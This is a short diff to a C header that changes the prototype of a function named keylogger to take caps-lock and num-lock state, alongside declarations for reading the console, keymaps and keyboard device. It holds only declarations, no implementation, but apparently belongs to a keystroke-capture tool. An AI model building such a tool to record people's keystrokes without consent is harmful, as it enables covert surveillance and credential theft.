@@ -23,6 +23,6 @@ int				get_console();
 int				get_keymaps(int, int **);
 int				**get_keys(int, int, int, int **);
 char			*get_keyboard();
-void			keylogger(int keybd, int **key_table);
+void			keylogger(int keybd, int **key_table, int capslock, int numlock);
 
 #endif
